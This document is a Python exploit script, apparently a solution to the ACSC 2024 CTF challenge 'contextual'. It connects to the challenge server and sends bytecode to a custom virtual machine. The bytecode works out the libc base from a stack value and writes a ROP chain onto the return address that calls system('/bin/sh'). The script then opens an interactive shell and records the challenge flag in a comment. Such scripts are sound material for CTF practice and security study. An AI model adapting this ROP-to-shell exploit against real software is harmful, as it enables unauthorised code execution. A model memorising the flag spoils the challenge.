#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
from tools.assembler import aasm

bin_file = './distribute/share/contextual'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'contextual.chal.2024.ctf.acsc.asia', 'port':10101})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_main           = libc.sep_function['__libc_start_main']
ofs_libc_str_sh         = next(libc.search(b'/bin/sh'))

#==========

def attack(conn, **kwargs):
    ofs_stack_code2ret = 0x60c4
    ofs_stack_code2ret = u64(pack(-ofs_stack_code2ret, '64'))

    code = f'''
    push <8> {ofs_stack_code2ret}
    pop <8> r0
    load <8> r1, 0
    sub r1, r0

    load <8> r6, [r1]
    load <8> r3, {ofs_libc_main-0x30}
    sub r6, r3

    load <8> r2, 0x8
    '''

    rop = ROP(libc)
    rop.call(rop.ret)
    rop.system(ofs_libc_str_sh)

    for ofs in map(u64, split_n(bytes(rop), 8)):
        code += f'''
        load <8> r3, {ofs}
        add r3, r6
        store <8> [r1], r3
        add r1, r2
        '''
    code += 'exit'

    bcode = aasm(code)

    conn.sendlineafter(b': ', str(len(bcode)).encode())
    conn.sendafter(b': ', bcode)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # /home/Contextual/flag
    # ACSC{f4il3d_to_s33_th4t_0ne_c0m1n6_d1dnt_y0u}

if __name__=='__main__':
    main()

#==========
